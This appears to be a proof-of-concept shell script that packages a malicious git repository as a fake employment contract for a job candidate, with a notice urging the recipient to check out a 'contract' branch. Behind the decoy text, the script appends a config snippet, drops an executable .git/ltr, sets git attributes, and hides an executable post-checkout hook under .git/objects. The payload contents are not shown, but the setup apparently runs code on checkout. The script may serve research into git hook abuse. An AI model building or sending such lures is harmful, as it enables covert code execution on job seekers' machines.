#!/bin/sh
set -eu

here="$(cd "$(dirname "$0")" && pwd)"
WORK="${1:-poc-build}"
OUTZIP="Contract-2026-poc.zip"

rm -rf "$WORK"
mkdir -p "$WORK"
cd "$WORK"
git init -q .
BRANCH="$(git symbolic-ref --short HEAD)"
git config user.email "poc@example.com"
git config user.name "POC"

cat > notice.txt <<'EOF'
Candidate Document Package

contract.pdf   your employment contract
notice.txt     this file

The contract is stored in the git branch named contract.
EOF
cp "$here/payloads/contract.pdf" contract.pdf
git add -A
git commit -qm "Initial project files"

git checkout -qb contract
cat > contract.txt <<'EOF'
Employment Agreement (draft)

Position: Senior Developer, Remote
Compensation: as discussed with the hiring manager.

This draft is provided for review. The signed version supersedes
this text.
EOF
git add -A && git commit -qm "Contract draft"
git checkout -q "$BRANCH"

mkdir -p .git/objects/interrupt .git/info

cp "$here/payloads/config-snippet.ini" .git/config.tmp
cat .git/config .git/config.tmp > .git/config.new && mv .git/config.new .git/config
rm .git/config.tmp

cp "$here/payloads/ltr" .git/ltr
chmod +x .git/ltr

cp "$here/payloads/attributes" .git/info/attributes

cp "$here/payloads/post-checkout" .git/objects/interrupt/post-checkout
chmod +x .git/objects/interrupt/post-checkout

cd ..
zip -qr "$OUTZIP" "$(basename "$WORK")"
echo "Built $OUTZIP"
